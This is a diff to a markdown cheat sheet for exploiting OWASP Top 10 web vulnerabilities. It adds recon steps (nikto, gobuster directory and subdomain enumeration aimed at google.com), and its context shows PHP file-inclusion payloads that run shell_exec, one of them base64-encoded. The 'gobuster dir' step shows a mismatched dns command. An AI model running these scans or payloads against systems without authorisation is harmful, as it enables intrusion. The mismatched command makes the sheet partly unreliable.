@@ -4,6 +4,14 @@ This is a cheat sheet for exploitation of OWASP Top 10.
 
 It is the followed by more refined attacks. 
 
+# Frist things to do
+
+1. run nikto: vulnerability scan
+2. gobuster dir: find hidden directories
+`gobuster dns -u google.com -w wordlist.txt`
+3. dobuster dns: enumerate subdomains
+`gobuster dns -d google.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
+
 # OWASP Top 10
 
 ## Command Injection
@@ -220,6 +228,8 @@ http://192.168.xxx.10/menu.php?file=data:text/plain,<?php echo shell_exec("dir")
 
 http://192.168.xxx.10/menu.php?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pg==
 ```
+
+
 
 ## API
 
